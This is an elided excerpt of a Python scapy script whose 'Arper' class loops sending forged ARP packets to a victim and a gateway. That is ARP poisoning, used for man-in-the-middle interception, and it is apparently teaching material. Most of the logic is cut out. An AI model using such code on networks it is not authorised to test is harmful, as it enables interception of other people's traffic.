...
from scapy.all import (ARP, Ether, conf, get_if_hwaddr, sendp, sniff, srp, wrpcap)
import os
import sys
import time
...
class Arper:
    ...
    def poison(self):
        ...
        while True:
            ...
            sys.stdout.flush()
            try:
                sendp(Ether(dst=self.victimmac)/poison_victim, iface=self.interface)
                sendp(Ether(dst=self.gatewaymac)/poison_gateway, iface=self.interface)
